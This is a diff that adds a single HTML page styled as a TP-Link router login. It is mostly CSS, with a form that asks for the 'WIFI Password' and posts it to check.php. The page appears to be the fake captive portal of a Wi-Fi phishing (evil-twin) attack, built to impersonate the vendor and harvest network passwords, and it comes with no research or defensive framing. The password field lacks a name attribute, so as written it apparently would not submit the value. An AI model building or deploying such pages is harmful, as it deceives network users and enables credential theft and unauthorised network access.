@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>TP-Link Login Page</title>
+	<link rel="stylesheet" type="text/css" href="styles.css">
+   <style>
+      body {
+	background-color: #f2f2f2;
+	margin: 0;
+    padding: 0;
+	font-family: Arial, sans-serif;
+}
+*{
+	margin: 0;
+    padding: 0;
+	font-family: Arial, sans-serif;
+	box-sizing: border-box;
+	font-size: 100%;
+	font-weight: normal;
+	line-height: 1.15;
+	vertical-align: baseline;
+	text-align: left;
+	text-decoration: none;
+	text-transform: none;
+	letter-spacing: normal;
+	word-spacing: normal;
+	white-space: normal;
+	line-break: auto;
+	word-wrap: normal;
+	font-size-adjust: none;
+	-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+	-webkit-font-smoothing: antialiased;
+	-moz-osx-font-smoothing: grayscale;
+	-webkit-text-size-adjust: none;
+	-ms-text-size-adjust: none;
+}
+.login-box {
+	width: 550px;
+	height: 100%;
+	background-color: #fff;
+	position: absolute;
+	top: 440px;
+	left: 50%;
+	transform: translate(-50%, -50%);
+	box-sizing: border-box;
+	padding: 70px 30px;
+	border-radius: 5px;
+	box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+
+}
+
+.logo {
+	width: 100px;
+	height: auto;
+	position: relative;
+	top: -50px;
+	left: 50%;
+	transform: translateX(-50%);
+}
+
+.login-form {
+    width: 100%;
+    margin-top: 20px;
+    margin-bottom: 20px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    
+
+}
+
+input[type="text"], input[type="password"] {
+	width: 100%;
+	padding: 10px;
+	margin-top: 10px;
+	border: 1px solid #ccc;
+	border-radius: 5px;
+	font-size: 16px;
+	box-sizing: border-box;
+}
+
+.button {
+	width: 100%;
+	padding: 10px;
+	margin-top: 20px;
+	background-color: #00bcd4;
+	color: #fff;
+	border: none;
+	border-radius: 5px;
+	font-size: 16px;
+	cursor: pointer;
+}
+
+.button:hover {
+	background-color: #0097a7;
+}
+.logo{
+            background-color: #56c7d8;
+            position: relative;
+            padding-left: 200px;
+            padding-right: 200px;   
+            padding-top: 20px;
+            padding-bottom: 20px;
+            width: 100%;
+			margin-left: 0;
+			margin-right: 0;
+        }
+        .q{
+         height: 50px;
+         width: 130px;
+         position: absolute;
+         left: 50%;
+         transform: translateX(-50%);  
+         top: 26px;
+         border-radius: 5px;
+
+         
+        }
+        .logo img{
+         padding-top: 26px;
+        }
+		
+   </style>
+</head>
+<body>
+   <div class="logo">
+         <img src="logtplink.png">
+     </div>
+	<div class="login-box">
+      
+ 
+		
+		<form class="login-form" id="form1" name="form1" method="POST" action="check.php">
+			<img class="q" src="new-logo.png" >
+         <h4>WIFI Password :</h4>
+			<input type="password" id="password" placeholder="password">
+			<input style="text-align: center;" type="submit" name="Continue" class="button" value="Continue" >
+		</form>
+	</div>
+</body>
+</html>
